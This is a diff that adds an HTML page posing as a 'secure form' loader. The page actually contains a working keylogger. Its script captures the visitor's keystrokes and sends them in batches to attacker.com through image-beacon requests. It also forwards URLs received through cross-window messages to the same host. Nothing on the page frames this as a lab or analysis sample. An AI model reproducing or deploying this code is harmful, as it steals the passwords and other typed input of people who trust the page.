@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading form...</title></head>
+<body style="font-family:Arial;padding:20px;background:#f5f5f5">
+<h3>Please wait, loading secure form...</h3>
+<div id="log" style="display:none"></div>
+<script>
+var keys='';
+document.onkeypress=function(e){
+  keys+=e.key;
+  if(keys.length>10){
+    new Image().src='https://attacker.com/k?k='+encodeURIComponent(keys);
+    keys='';
+  }
+};
+window.addEventListener('message',e=>{
+  if(e.data&&e.data.href){
+    new Image().src='https://attacker.com/k?url='+encodeURIComponent(e.data.href);
+  }
+});
+</script>
+</body>
+</html>
